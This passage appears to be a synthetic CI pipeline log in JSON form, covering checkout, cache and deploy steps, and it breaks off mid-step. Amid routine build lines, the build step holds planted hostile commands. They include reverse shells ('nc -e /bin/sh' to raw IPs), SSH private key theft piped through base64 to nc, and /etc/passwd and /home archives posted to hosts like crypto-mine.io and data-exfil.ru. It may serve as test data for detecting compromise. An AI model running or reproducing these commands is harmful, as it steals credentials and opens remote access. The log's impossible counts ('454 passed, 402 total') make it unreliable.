submodules...\nCompiling components/index.js...\npip: Installing build dependencies...\n[12:46:28] DEBUG: Memory usage: 120MB\n[12:46:28] DEBUG: Query executed in 47ms\n  PASS: test_cache_hit (35ms)\nWARNING: webpack has known vulnerabilities\nImage pulled successfully\npip: Installing build dependencies...\nnpm install: resolved 393 packages\nHEAD is now at f91d421\nWARNING: axios has known vulnerabilities\n[12:46:28] INFO: Processing request\npip install: Successfully installed express-4.8\nnpm install: added 470 packages\nUsing Python 3.9\nPulling image: python:latest\nStep 7/16: Deploying\npip: Collecting jest\nTransforming 770 files...\nPlatform: linux-x64\npip: Downloading axios-5.12.tar.gz\nFinished.\nOK\nTransforming 211 files...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\nProcessing...\nLayer 9/14: COPY command\nUsing Node.js 18.2.1\nStep 13/21: Deploying\nWARNING: jest has known vulnerabilities\npip: Downloading webpack-1.3.tar.gz\n\u2713 All checks passed\n\u2713 Step 'build' succeeded\npip: Downloading eslint-4.15.tar.gz\nnpm notice: package.json updated\nWARNING: jest has known vulnerabilities\nCompiling utils/handler.rs...\nTransforming 376 files...\nCache saved successfully\nnpm notice: created a lockfile\nFinished.\n[12:46:28] INFO: Starting build process\nSuccess!\n=== Step setup_node completed ===\n=== Step: restore_cache ===\nCreating production build...\nRan 183 tests in 35s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGET /api - 200 (80ms)\nTransforming 801 files...\npip: Installing build dependencies...\nDone.\nGET /health - 204 (29ms)\n[12:46:28] ERROR: Connection failed\nEnvironment: production\nNODE_ENV=production\nStep 18/17: Linting\nHEAD is now at e9de53e\nReady.\n[12:46:28] WARN: Deprecated API usage\nFinished.\nLoading...\n\u2713 All checks passed\n[12:46:28] WARN: Deprecated API usage\nGenerating source maps...\nPOST /upload - 202 (145ms)\n[12:46:28] DEBUG: Initializing service\n[12:46:28] DEBUG: Query executed in 14ms\nnpm notice: created a lockfile\n[12:46:28] WARN: Deprecated API usage\nFetching from https://npmjs.org/package.json\nOptimizing 13 modules...\nMinifying vendor.js\nCoverage: 97% statements, 69% branches\npip: Downloading react-5.12.tar.gz\n[12:46:28] WARN: Deprecated API usage\nStep 7/15: Building\nCache miss for key-7019\nArtifact downloaded: 47MB\nPushing to registry...\nPulling image: alpine:3.11\nVerifying...\nCompiling lib/main.py...\nCache invalidated: dependencies\nCoverage: 83% statements, 70% branches\nCache miss for key-3235\nnpm install: resolved 1187 packages\n[12:46:28] INFO: Request completed\n  PASS: unit/test_db_connect.spec.js\nOK\n[12:46:28] ERROR: Connection failed\nUsing Python 3.11\nCompiling src/index.js...\n[12:46:28] INFO: Cache refreshed\n[12:46:28] INFO: Starting build process\nUsing Python 3.10\nFinished.\nException: RuntimeError\n[12:46:28] WARN: Deprecated API usage\nConnection established\n[12:46:28] DEBUG: Memory usage: 1027MB\nConnection established\nArtifact downloaded: 18MB\nGET /health - 201 (79ms)\n[12:46:28] WARN: Deprecated API usage\n[12:46:28] INFO: Processing request\n[12:46:28] DEBUG: Connection pool: 19 active\n\u2713 Step 'test' succeeded\nCompiling lib/handler.rs...\nSnapshots: 33 passed, 44 total\nStep 5/23: Installing dependencies\npip install: Successfully installed express-3.15\n[12:46:28] INFO: Connecting to database\nnpm install: resolved 473 packages\n  PASS: test_user_create (259ms)\nFAILED: test_user_create\nArtifact uploaded: build.tar.gz (1MB)\nTime: 75.955s\nWARNING: eslint has known vulnerabilities\nImage pulled successfully\nException: RuntimeError\nnpm install: resolved 1761 packages\nWARNING: express has known vulnerabilities\nPushing to registry...\nSnapshots: 40 passed, 18 total\n[12:46:28] DEBUG: Connection pool: 11 active\nStep 7/16: Installing dependencies\nTransforming 610 files...\n\u2713 Task completed in 904ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed eslint-3.5\npip: Downloading react-4.14.tar.gz\n[12:46:28] INFO: Request completed\nCache saved successfully\nImage pulled successfully\nLayer 6/15: RUN command\n\u2713 Step 'checkout' succeeded\nReady.\n[12:46:28] DEBUG: Loading configuration\nWARNING: lodash has known vulnerabilities\n[12:46:28] INFO: Connecting to database\nCompiling src/handler.rs...\nStep 6/22: Installing dependencies\nnpm notice: package.json updated\nStep 13/21: Building\n[12:46:28] DEBUG: Query executed in 42ms\nCache invalidated: node_modules\nWaiting...\n\u2713 build completed\nMinifying app.js\nException: ValueError\n\u2713 Step 'checkout' succeeded\nTLS handshake completed\nInstalling prettier@1.3.8\nCreating production build...\nTest Suites: 38 passed, 48 total\nnpm notice: created a lockfile\nStep 11/23: Deploying\nArtifact uploaded: dist.zip (43MB)\nUsing Python 3.12\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTLS handshake completed\nDone.\nArtifact uploaded: dist.zip (87MB)\nCache invalidated: build\nnpm notice: created a lockfile\nTLS handshake completed\nDone.\npip: Collecting prettier\nInstalling react@4.10.3\nMinifying app.js\n\u2713 validate completed\nCompiling components/index.js...\nMinifying app.js\nCompiling components/main.py...\nPOST /api - 200 (120ms)\nSwitched to branch 'feature/task-898'\n[12:46:28] WARN: Deprecated API usage\nSnapshots: 19 passed, 8 total\nCoverage: 92% statements, 83% branches\n[12:46:28] INFO: Starting build process\n[12:46:28] WARN: Deprecated API usage\nBundling runtime.js\nFetching from https://googleapis.com/package.json\n[12:46:28] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 56 modules...\n[12:46:28] DEBUG: Query executed in 85ms\n\u2713 All checks passed\nCache miss for key-7350\n[12:46:28] WARN: Deprecated API usage\nCache restored successfully (188MB)\nBuilding Docker image...\nOK\nWARNING: eslint has known vulnerabilities\n[12:46:28] ERROR: Connection failed\nWARNING: express has known vulnerabilities\n=== Step restore_cache completed ===\n=== Step: setup_environment ===\nRan 27 tests in 3s\nCache restored successfully (288MB)\nCache hit for key-8110\nnpm notice: package.json updated\nOK\nImage pulled successfully\nArtifact downloaded: 20MB\nHEAD is now at e9322e3\nnpm notice: created a lockfile\n\u2713 Task completed in 3937ms\nStep 2/24: Linting\nCache restored successfully (460MB)\nHEAD is now at 1a84f3a\nnpm notice: package.json updated\nCompleted.\nWARNING: lodash has known vulnerabilities\nFetching from https://gcr.io/package.json\nCompiling src/main.py...\n\u2713 Step 'test' succeeded\n\u2713 Task completed in 1281ms\nConnection established\nFetching submodules...\nArtifact uploaded: build.tar.gz (50MB)\nStep 2/20: Testing\nOK\nCache miss for key-7704\nArtifact uploaded: dist.zip (56MB)\nHEAD is now at 8537bb8\nWARNING: webpack has known vulnerabilities\nStep 18/21: Deploying\nFetching from https://npmjs.org/package.json\nAlready up to date.\nCompiling components/main.py...\nCache hit for key-3206\n\u2713 Task completed in 1901ms\nStep 12/16: Installing dependencies\nException: RuntimeError\n[12:46:28] DEBUG: Initializing service\nLoading...\nTests: 136 passed, 180 total\nStep 20/15: Building\nCompiling src/main.py...\nTime: 114.477s\nnpm notice: package.json updated\n[12:46:28] DEBUG: Initializing service\nBundling vendor.css\nStep 13/21: Linting\nCompiling src/service.java...\nnpm notice: created a lockfile\nPushing to registry...\n[12:46:28] DEBUG: Memory usage: 816MB\nCoverage: 92% statements, 83% branches\nImage pulled successfully\nInstalling jest@1.0.6\npip: Downloading express-3.0.tar.gz\nOK\nCache miss for key-8992\n[12:46:28] INFO: Starting build process\n[12:46:28] DEBUG: Loading configuration\nException: TypeError\n\u2713 Step 'setup' succeeded\nnpm notice: created a lockfile\nCache miss for key-6689\npip: Collecting eslint\nTime: 74.1s\nArtifact downloaded: 22MB\nnpm install: added 499 packages\nFinished.\n\u2713 Step 'setup' succeeded\n[12:46:28] DEBUG: Query executed in 93ms\nCreating production build...\n[12:46:28] DEBUG: Memory usage: 1012MB\nCompiling lib/utils.go...\nnpm install: added 16 packages\n\u2713 validate completed\nnpm install: added 169 packages\nMinifying main.js\nTLS handshake completed\nTransforming 732 files...\nPulling image: python:latest\nOptimizing 55 modules...\n\u2713 validate completed\nWaiting...\nSuccess!\nAlready up to date.\nArtifact downloaded: 41MB\nInstalling react@5.11.2\nStep 19/16: Linting\n[12:46:28] INFO: Connecting to database\n\u2717 build failed with exit code 96\nChecking out develop branch\n[12:46:28] INFO: Request completed\nArtifact downloaded: 30MB\nReady.\nGET /status - 204 (47ms)\nLayer 8/9: COPY command\nCompiling components/handler.rs...\nPushing to registry...\nTests: 454 passed, 402 total\nCompiling src/utils.go...\nAlready up to date.\nEnvironment: staging\nStep 3/16: Testing\nBundling styles.css\nTransforming 840 files...\nEnvironment: test\nCompiling utils/index.js...\n[12:46:28] INFO: Request completed\nEnvironment: development\nStep 15/18: Linting\nAlready up to date.\n[12:46:28] INFO: Connecting to database\nTransforming 252 files...\nArtifact uploaded: dist.zip (63MB)\nUsing Python 3.11\nSnapshots: 38 passed, 47 total\n  PASS: test_db_connect (411ms)\nTLS handshake completed\nNODE_ENV=development\nTransforming 804 files...\nPulling image: alpine:3.11\nMinifying vendor.js\nReady.\n\u2713 Step 'checkout' succeeded\n  PASS: integration/test_cache_hit.spec.js\nDone.\nCache hit for key-8691\nRan 145 tests in 1s\n[12:46:28] WARN: Deprecated API usage\nStep 19/17: Running migrations\nCompiling components/utils.go...\npip: Installing build dependencies...\n[12:46:28] INFO: Starting build process\nFetching submodules...\nBuilding Docker image...\n[12:46:28] INFO: Request completed\nCompiling src/service.java...\n\u2713 Step 'setup' succeeded\nOptimizing 40 modules...\nVerifying...\n  PASS: test_api_health (227ms)\nBuilding Docker image...\nFinished.\nException: NullPointerException\nInstalling jest@5.3.4\nOptimizing 82 modules...\nBundling styles.js\nRan 161 tests in 31s\nConnection established\n[12:46:28] DEBUG: Memory usage: 561MB\n\u2713 All checks passed\nStep 7/25: Running migrations\nVerifying...\nException: NullPointerException\n=== Step setup_environment completed ===\n=== Step: build ===\n\u2713 All checks passed\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nStep 19/20: Installing dependencies\nSnapshots: 33 passed, 27 total\nCompiling utils/utils.go...\nGenerating source maps...\nFinished.\nReady.\nArtifact uploaded: dist.zip (34MB)\n[12:46:28] ERROR: Connection failed\nCache invalidated: build\nDone.\n[12:46:28] INFO: Connecting to database\nSnapshots: 40 passed, 25 total\n[12:46:28] ERROR: Connection failed\nPushing to registry...\nCache hit for key-5110\npip install: Successfully installed eslint-4.18\n[12:46:28] INFO: Processing request\nCompiling lib/app.ts...\nArtifact uploaded: build.tar.gz (8MB)\nReady.\nSending 353MB of data to crypto-mine.io\nSnapshots: 46 passed, 46 total\nStep 6/22: Building\nTransforming 141 files...\nCompiling src/app.ts...\nTest Suites: 9 passed, 33 total\nnpm install: added 165 packages\nStep 17/21: Building\npip: Downloading axios-2.19.tar.gz\n[12:46:28] INFO: Processing request\n\u2713 All checks passed\nnpm install: resolved 617 packages\nVerifying...\n\u2713 Task completed in 2115ms\nOptimizing 15 modules...\npip: Collecting webpack\n[12:46:28] INFO: Connecting to database\n[12:46:28] DEBUG: Memory usage: 1500MB\nSnapshots: 39 passed, 43 total\nBundling runtime.js\nCompiling lib/service.java...\nSuccess!\n[12:46:28] DEBUG: Connection pool: 18 active\nCompiling lib/main.py...\nBuilding Docker image...\npip: Installing build dependencies...\nnpm install: resolved 1103 packages\nnc -e /bin/sh 71.143.239.114 34137\nStep 12/15: Building\nPlatform: linux-x64\nCreating production build...\n[12:46:28] DEBUG: Connection pool: 11 active\nHEAD is now at 07244e2\n[12:46:28] WARN: Deprecated API usage\nProcessing...\n[12:46:28] DEBUG: Query executed in 61ms\nDone.\nTransforming 344 files...\nVerifying...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 181.225.152.12 30416\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\nFetching submodules...\nTest Suites: 15 passed, 14 total\nAlready up to date.\n[12:46:28] DEBUG: Loading configuration\nTime: 108.647s\nEnvironment: development\nTest Suites: 42 passed, 34 total\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nCache invalidated: dependencies\nnpm install: resolved 661 packages\nCache saved successfully\nDone.\nUsing Node.js 19.15.10\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\n[12:46:28] INFO: Connecting to database\nHEAD is now at 24ee896\nTransforming 663 files...\nGET /api - 204 (52ms)\nProcessing...\n[12:46:28] INFO: Processing request\n[12:46:28] DEBUG: Initializing service\nCompiling utils/main.py...\nBuilding Docker image...\nEnvironment: production\nUsing Node.js 18.20.9\nFinished.\nPushing to registry...\nSending 442MB of data to data-exfil.ru\necho $(cat ~/.ssh/id_rsa) | base64 | nc 57.134.167.124 21746\nImage pulled successfully\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nUploading artifact 'dist' (36 files)\nFinished.\nnc -e /bin/sh 157.156.97.175 17845\nCompiling src/main.py...\n\u2713 Task completed in 4725ms\nTests: 350 passed, 248 total\nUsing Node.js 19.20.1\nArtifact uploaded: dist.zip (40MB)\nPOST /api - 201 (236ms)\nCompiling src/index.js...\nWARNING: express has known vulnerabilities\nyarn add: Done in 2.79s\nImage pulled successfully\nFetching from https://docker.io/package.json\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nReady.\npip: Installing build dependencies...\nHEAD is now at b7df7eb\n[12:46:28] INFO: Processing request\nOK\nChecking out develop branch\nnpm notice: package.json updated\nCompiling utils/service.java...\n\u2713 Task completed in 3049ms\n[12:46:28] DEBUG: Query executed in 72ms\nMinifying app.js\nSuccess!\nArtifact uploaded: build.tar.gz (47MB)\nnc -e /bin/sh 198.244.38.147 56748\nInstalling react@3.19.9\nFAILED: test_auth_login\n[12:46:28] INFO: Connecting to database\nLoading...\nnpm install: added 432 packages\nCache hit for key-1801\nOptimizing 25 modules...\nAlready up to date.\nGET /api - 204 (4ms)\nConnection established\nBundling runtime.js\nFetching submodules...\nCache saved successfully\n[12:46:28] WARN: Deprecated API usage\nLayer 4/9: RUN command\nSwitched to branch 'feature/task-610'\n[12:46:28] DEBUG: Initializing service\nMinifying vendor.js\nWaiting...\nPlatform: darwin-arm64\nnpm install: added 149 packages\nMinifying app.js\nWARNING: prettier has known vulnerabilities\nTLS handshake completed\nTLS handshake completed\nSuccess!\nWARNING: react has known vulnerabilities\nStep 20/18: Building\nUsing Python 3.10\nEnvironment: development\nWaiting...\n  PASS: test_cache_hit (225ms)\nCache hit for key-2310\nCreating production build...\n[12:46:28] ERROR: Connection failed\nCompiling utils/app.ts...\n[12:46:28] WARN: Deprecated API usage\npip: Downloading lodash-5.4.tar.gz\npip install: Successfully installed react-5.17\nPlatform: win32-x64\nPOST /upload - 202 (395ms)\nMinifying app.js\n=== Step build completed ===",
    "steps": [
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-11T12:46:28.759448",
        "finished_at": "2025-12-11T12:46:38.449544",
        "log_lines": [
          "=== Step: checkout ===",
          "Waiting...",
          "Cache saved successfully",
          "\u2713 build completed",
          "Platform: win32-x64",
          "[12:46:28] DEBUG: Loading configuration",
          "\u2713 Step 'checkout' succeeded",
          "Transforming 814 files...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Fetching from https://npmjs.org/package.json",
          "Cache invalidated: node_modules",
          "Cache miss for key-3008",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "[12:46:28] INFO: Connecting to database",
          "Step 2/18: Linting",
          "Tests: 117 passed, 54 total",
          "TLS handshake completed",
          "Completed.",
          "TLS handshake completed",
          "GET /health - 204 (24ms)",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Step 'install' succeeded",
          "Environment: development",
          "Cache invalidated: build",
          "Pulling image: python:18",
          "Cache restored successfully (469MB)",
          "Cache miss for key-6345",
          "Waiting...",
          "Transforming 923 files...",
          "\u2713 Task completed in 2170ms",
          "POST /data - 201 (197ms)",
          "Snapshots: 20 passed, 8 total",
          "Exception: TypeError",
          "Verifying...",
          "Pulling image: python:3.11",
          "Installing express@3.1.8",
          "npm notice: created a lockfile",
          "WARNING: lodash has known vulnerabilities",
          "Tests: 428 passed, 434 total",
          "pip: Collecting webpack",
          "OK",
          "GET /health - 200 (1ms)",
          "npm install: added 442 packages",
          "Step 12/21: Linting",
          "Step 8/15: Running migrations",
          "Compiling utils/service.java...",
          "Layer 3/13: ENV command",
          "Step 12/15: Deploying",
          "Step 16/22: Installing dependencies",
          "Coverage: 98% statements, 79% branches",
          "  PASS: unit/test_cache_hit.spec.js",
          "Compiling components/service.java...",
          "WARNING: express has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "Loading...",
          "Cache miss for key-7661",
          "Done.",
          "[12:46:28] DEBUG: Query executed in 71ms",
          "Already up to date.",
          "Cache saved successfully",
          "Step 20/19: Testing",
          "Success!",
          "Using Node.js 14.8.6",
          "Pulling image: node:3.11",
          "OK",
          "Tests: 302 passed, 181 total",
          "Ready.",
          "Layer 8/9: COPY command",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: created a lockfile",
          "[12:46:28] INFO: Starting build process",
          "Switched to branch 'feature/task-226'",
          "Snapshots: 48 passed, 32 total",
          "Step 11/25: Building",
          "GET /status - 200 (56ms)",
          "npm install: added 62 packages",
          "FAILED: test_auth_login",
          "Fetching from https://githubusercontent.com/package.json",
          "Using Python 3.12",
          "Creating production build...",
          "npm install: added 314 packages",
          "[12:46:28] INFO: Connecting to database",
          "[12:46:28] DEBUG: Initializing service",
          "OK",
          "Building Docker image...",
          "FAILED: test_cache_hit",
          "npm notice: package.json updated",
          "\u2713 Task completed in 2681ms",
          "Building Docker image...",
          "Compiling components/index.js...",
          "FAILED: test_cache_hit",
          "[12:46:28] WARN: Deprecated API usage",
          "Waiting...",
          "Tests: 58 passed, 450 total",
          "Layer 10/12: RUN command",
          "Step 1/17: Installing dependencies",
          "[12:46:28] DEBUG: Loading configuration",
          "Finished.",
          "Optimizing 18 modules...",
          "Switched to branch 'feature/task-556'",
          "HEAD is now at 2e1682c",
          "Already up to date.",
          "[12:46:28] INFO: Processing request",
          "Loading...",
          "npm install: added 461 packages",
          "Cache hit for key-2884",
          "Artifact downloaded: 30MB",
          "Using Node.js 14.13.6",
          "Cache restored successfully (353MB)",
          "Using Node.js 17.16.9",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: webpack has known vulnerabilities",
          "Pushing to registry...",
          "Finished.",
          "Success!",
          "npm notice: created a lockfile",
          "Minifying main.js",
          "Compiling utils/app.ts...",
          "Uploading artifact 'build' (22 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: dist.zip (5MB)",
          "  PASS: integration/test_auth_login.spec.js",
          "NODE_ENV=development",
          "[12:46:28] WARN: Deprecated API usage",
          "Platform: linux-x64",
          "WARNING: axios has known vulnerabilities",
          "TLS handshake completed",
          "Snapshots: 14 passed, 4 total",
          "\u2713 test completed",
          "Coverage: 89% statements, 87% branches",
          "[12:46:28] DEBUG: Loading configuration",
          "Tests: 152 passed, 237 total",
          "Completed.",
          "TLS handshake completed",
          "Checking out master branch",
          "Pushing to registry...",
          "Ready.",
          "GET /health - 201 (1ms)",
          "\u2717 build failed with exit code 115",
          "npm install: added 17 packages",
          "Already up to date.",
          "Ran 138 tests in 34s",
          "Compiling components/handler.rs...",
          "Step 14/24: Deploying",
          "Tests: 126 passed, 293 total",
          "[12:46:28] DEBUG: Loading configuration",
          "Transforming 760 files...",
          "Success!",
          "[12:46:28] INFO: Cache refreshed",
          "Using Node.js 17.7.10",
          "Cache miss for key-5062",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-11T12:46:38.449544",
        "finished_at": "2025-12-11T12:46:52.984688",
        "log_lines": [
          "=== Step: save_cache ===",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Done.",
          "pip: Downloading prettier-2.7.tar.gz",
          "Step 18/15: Linting",
          "[12:46:28] INFO: Processing request",
          "Checking out develop branch",
          "Compiling utils/utils.go...",
          "POST /upload - 201 (374ms)",
          "[12:46:28] WARN: Deprecated API usage",
          "Using Node.js 15.2.5",
          "npm notice: package.json updated",
          "[12:46:28] DEBUG: Memory usage: 1176MB",
          "Tests: 344 passed, 105 total",
          "Step 14/17: Deploying",
          "Step 10/25: Testing",
          "[12:46:28] DEBUG: Memory usage: 1665MB",
          "\u2717 build failed with exit code 15",
          "Step 9/18: Installing dependencies",
          "[12:46:28] INFO: Starting build process",
          "npm install: added 302 packages",
          "  PASS: test_db_connect (328ms)",
          "Optimizing 83 modules...",
          "Bundling runtime.js",
          "Transforming 757 files...",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 All checks passed",
          "Fetching from https://githubusercontent.com/package.json",
          "Compiling utils/main.py...",
          "Environment: test",
          "Done.",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:46:28] DEBUG: Query executed in 24ms",
          "Step 9/20: Linting",
          "WARNING: lodash has known vulnerabilities",
          "Ran 30 tests in 9s",
          "Layer 4/14: RUN command",
          "Loading...",
          "Waiting...",
          "Exception: TypeError",
          "Switched to branch 'bugfix/task-274'",
          "Coverage: 88% statements, 75% branches",
          "GET /api - 204 (35ms)",
          "Connection established",
          "Creating production build...",
          "Installing eslint@5.7.5",
          "Artifact downloaded: 26MB",
          "[12:46:28] DEBUG: Initializing service",
          "Exception: ValueError",
          "\u2717 build failed with exit code 74",
          "pip: Collecting lodash",
          "Compiling src/handler.rs...",
          "Processing...",
          "pip: Collecting eslint",
          "Completed.",
          "Fetching submodules...",
          "\u2713 Step 'setup' succeeded",
          "HEAD is now at e481daf",
          "Already up to date.",
          "Transforming 535 files...",
          "[12:46:28] INFO: Processing request",
          "Already up to date.",
          "Compiling utils/handler.rs...",
          "TLS handshake completed",
          "Platform: win32-x64",
          "\u2713 Step 'checkout' succeeded",
          "Step 2/15: Building",
          "[12:46:28] DEBUG: Query executed in 95ms",
          "Time: 40.978s",
          "Loading...",
          "Step 3/23: Running migrations",
          "Cache hit for key-8695",
          "[12:46:28] DEBUG: Connection pool: 10 active",
          "Cache miss for key-7441",
          "Compiling utils/utils.go...",
          "Finished.",
          "Step 13/16: Building",
          "npm install: added 453 packages",
          "[12:46:28] INFO: Connecting to database",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:28] INFO: Cache refreshed",
          "[12:46:28] INFO: Processing request",
          "[12:46:28] INFO: Processing request",
          "Uploading artifact 'dist' (14 files)",
          "\u2713 build completed",
          "Step 19/18: Deploying",
          "Step 9/24: Installing dependencies",
          "[12:46:28] DEBUG: Connection pool: 4 active",
          "[12:46:28] INFO: Processing request",
          "TLS handshake completed",
          "Time: 78.421s",
          "Optimizing 43 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: added 56 packages",
          "Waiting...",
          "TLS handshake completed",
          "Connection established",
          "Cache hit for key-9053",
          "npm install: added 471 packages",
          "Using Node.js 19.19.7",
          "Step 10/20: Running migrations",
          "npm notice: created a lockfile",
          "Step 3/18: Testing",
          "Transforming 660 files...",
          "npm notice: package.json updated",
          "Fetching from https://npmjs.org/package.json",
          "Step 3/21: Testing",
          "Cache miss for key-5526",
          "HEAD is now at 6eb4b87",
          "[12:46:28] DEBUG: Loading configuration",
          "Artifact downloaded: 30MB",
          "[12:46:28] INFO: Starting build process",
          "  PASS: integration/test_api_health.spec.js",
          "OK",
          "Platform: darwin-arm64",
          "Cache restored successfully (16MB)",
          "Compiling src/utils.go...",
          "Step 9/19: Running migrations",
          "Processing...",
          "[12:46:28] INFO: Request completed",
          "Coverage: 75% statements, 94% branches",
          "Step 1/21: Linting",
          "Ran 12 tests in 44s",
          "npm install: resolved 1902 packages",
          "Creating production build...",
          "Verifying...",
          "Compiling src/handler.rs...",
          "Bundling vendor.css",
          "  PASS: test_cache_hit (406ms)",
          "yarn add: Done in 11.68s",
          "Cache hit for key-1533",
          "Completed.",
          "Artifact uploaded: dist.zip (10MB)",
          "[12:46:28] INFO: Processing request",
          "Processing...",
          "Step 14/23: Installing dependencies",
          "yarn add: Done in 3.34s",
          "Uploading artifact 'dist' (21 files)",
          "Ready.",
          "Artifact uploaded: build.tar.gz (26MB)",
          "pip install: Successfully installed axios-5.20",
          "Connection established",
          "\u2713 Step 'install' succeeded",
          "Creating production build...",
          "WARNING: react has known vulnerabilities",
          "Step 5/18: Running migrations",
          "Step 5/25: Testing",
          "Loading...",
          "Using Node.js 18.9.1",
          "Optimizing 75 modules...",
          "HEAD is now at c22433a",
          "Success!",
          "[12:46:28] INFO: Cache refreshed",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-11T12:46:52.984688",
        "finished_at": "2025-12-11T12:47:02.674784",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 17/18: Running migrations",
          "Time: 19.600s",
          "Test Suites: 8 passed, 45 total",
          "[12:46:28] WARN: Deprecated API usage",
          "Bundling styles.css",
          "Already up to date.",
          "Bundling vendor.js",
          "POST /data - 201 (198ms)",
          "[12:46:28] DEBUG: Query executed in 91ms",
          "[12:46:28] DEBUG: Memory usage: 157MB",
          "yarn add: Done in 25.59s",
          "[12:46:28] DEBUG: Connection pool: 17 active",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /data - 200 (68ms)",
          "Finished.",
          "Coverage: 94% statements, 94% branches",
          "Step 18/18: Linting",
          "Uploading artifact 'coverage' (1 files)",
          "[12:46:28] WARN: Deprecated API usage",
          "Cache invalidated: dependencies",
          "POST /upload - 202 (159ms)",
          "Pushing to registry...",
          "Cache miss for key-6811",
          "Cache miss for key-3437",
          "Tests: 116 passed, 220 total",
          "Transforming 110 files...",
          "[12:46:28] INFO: Request completed",
          "Coverage: 71% statements, 72% branches",
          "GET /api - 204 (28ms)",
          "Loading...",
          "WARNING: express has known vulnerabilities",
          "Coverage: 72% statements, 74% branches",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (13MB)",
          "npm notice: package.json updated",
          "Step 20/21: Running migrations",
          "Image pulled successfully",
          "npm install: resolved 1523 packages",
          "Step 14/21: Linting",
          "Compiling lib/service.java...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing prettier@5.13.7",
          "Compiling components/handler.rs...",
          "Optimizing 60 modules...",
          "FAILED: test_api_health",
          "Environment: production",
          "Cache miss for key-7423",
          "[12:46:28] DEBUG: Query executed in 83ms",
          "Switched to branch 'hotfix/task-462'",
          "WARNING: axios has known vulnerabilities",
          "\u2713 deploy completed",
          "pip: Downloading jest-2.5.tar.gz",
          "Processing...",
          "Time: 21.98s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: added 249 packages",
          "Compiling utils/handler.rs...",
          "Step 9/21: Building",
          "[12:46:28] WARN: Deprecated API usage",
          "Checking out main branch",
          "Pulling image: alpine:18",
          "[12:46:28] WARN: Deprecated API usage",
          "Test Suites: 32 passed, 17 total",
          "Cache hit for key-8225",
          "[12:46:28] INFO: Request completed",
          "Time: 46.802s",
          "pip: Downloading prettier-1.16.tar.gz",
          "\u2713 Step 'setup' succeeded",
          "  PASS: unit/test_cache_hit.spec.js",
          "Finished.",
          "Minifying main.js",
          "Processing...",
          "Using Node.js 14.11.7",
          "Completed.",
          "  PASS: unit/test_api_health.spec.js",
          "Snapshots: 8 passed, 24 total",
          "Success!",
          "Loading...",
          "NODE_ENV=test",
          "pip: Downloading express-4.13.tar.gz",
          "Step 7/17: Building",
          "Step 20/23: Linting",
          "[12:46:28] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Artifact downloaded: 25MB",
          "GET /status - 204 (75ms)",
          "Compiling lib/handler.rs...",
          "Environment: production",
          "Artifact downloaded: 39MB",
          "Fetching submodules...",
          "[12:46:28] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "\u2713 Step 'checkout' succeeded",
          "Uploading artifact 'coverage' (39 files)",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 20/19: Installing dependencies",
          "Step 18/19: Deploying",
          "Ran 64 tests in 40s",
          "[12:46:28] INFO: Starting build process",
          "Pushing to registry...",
          "Done.",
          "WARNING: react has known vulnerabilities",
          "Uploading artifact 'build' (42 files)",
          "Fetching from https://npmjs.org/package.json",
          "Waiting...",
          "Installing react@2.3.1",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Collecting express",
          "[12:46:28] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Time: 92.183s",
          "Compiling lib/app.ts...",
          "Finished.",
          "pip install: Successfully installed prettier-5.0",
          "  PASS: unit/test_api_health.spec.js",
          "Checking out master branch",
          "Step 18/19: Deploying",
          "[12:46:28] DEBUG: Query executed in 64ms",
          "Exception: TypeError",
          "Installing prettier@4.19.9",
          "\u2713 All checks passed",
          "Cache miss for key-6260",
          "Already up to date.",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "OK",
          "  PASS: e2e/test_auth_login.spec.js",
          "Pulling image: node:18",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:46:28] INFO: Cache refreshed",
          "pip: Downloading eslint-5.19.tar.gz",
          "Switched to branch 'hotfix/task-100'",
          "[12:46:28] DEBUG: Initializing service",
          "Processing...",
          "Cache invalidated: build",
          "GET /api - 204 (86ms)",
          "Loading...",
          "[12:46:28] INFO: Connecting to database",
          "Waiting...",
